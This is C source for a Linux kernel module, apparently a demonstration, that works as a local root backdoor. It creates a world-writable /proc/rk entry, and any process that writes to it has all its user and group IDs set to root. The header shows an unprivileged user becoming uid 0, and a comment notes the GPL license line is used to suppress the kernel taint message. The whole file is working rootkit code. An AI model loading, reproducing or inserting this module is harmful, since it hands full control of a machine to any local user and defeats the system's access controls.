/*
 * Example Linux Loadable Kernel Module that gives an unprivileged process root
 * via /proc/rk to demonstrate ELKM
 *
 * $ id
 * uid=1001(test) gid=1001(test) groups=1001(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 * $ echo 0 > /proc/rk
 * -bash: echo: write error: Operation not permitted
 * $ id
 * uid=0(root) gid=0(root) groups=0(root),1001(test) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 *
 */

#include <linux/cred.h>
#include <linux/kernel.h>   
#include <linux/module.h>
#include <linux/proc_fs.h>

#define MODULE_NAME "rk"
 
static struct proc_dir_entry *rk_file;

/*
 * Called when a process writes to proc file: echo 0 > /proc/rk
 */
static ssize_t
proc_write(struct file *file, const char __user *buff, size_t len, loff_t *off)
{
	/* from https://www.kernel.org/doc/Documentation/security/credentials.txt
	 */
	struct cred *new;
	new = prepare_creds();

	if (new == NULL)
		return(1);

	new->uid.val = 0;
	new->gid.val = 0;
	new->euid.val = 0;
	new->egid.val = 0;
	new->suid.val = 0;
	new->sgid.val = 0;
	new->fsuid.val = 0;
	new->fsgid.val = 0;

	commit_creds(new);

#ifdef DEBUG
	printk(KERN_DEBUG "proc_write() called\n");
#endif
	return(0);
}
 
static struct file_operations fops = 
{
	.write = proc_write,
};

int
rk_init_module(void)
{
	rk_file = proc_create(MODULE_NAME, 0006, NULL, &fops);
	if (rk_file == NULL)
		return(-ENOMEM);

	return(0);
}

/*
 * This function is called when the module is unloaded
 */
void
rk_cleanup_module(void)
{
	proc_remove(rk_file);
}

/* 
 * Get rid of taint message by declaring code as GPL. 
 */
MODULE_LICENSE("GPL");
 
module_init(rk_init_module);
module_exit(rk_cleanup_module);
